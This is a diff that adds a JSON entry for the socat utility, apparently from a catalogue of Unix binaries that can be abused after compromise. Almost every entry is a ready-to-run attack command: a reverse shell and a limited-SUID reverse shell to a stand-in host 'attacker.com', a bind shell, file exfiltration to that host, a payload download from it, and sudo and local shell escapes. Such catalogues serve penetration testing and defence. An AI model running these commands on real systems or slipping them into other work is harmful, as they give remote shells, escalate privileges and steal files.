@@ -1,0 +1,56 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "The resulting shell is not a proper TTY shell and lacks the prompt.",
+        "code": "socat stdin exec:/bin/sh\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
+        "code": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "bind-shell": [
+      {
+        "description": "Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.",
+        "code": "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.",
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.",
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\nsocat -u \"file:$LFILE\" -\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "The resulting shell is not a proper TTY shell and lacks the prompt.",
+        "code": "sudo socat stdin exec:/bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
+        "code": "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ]
+  }
+}
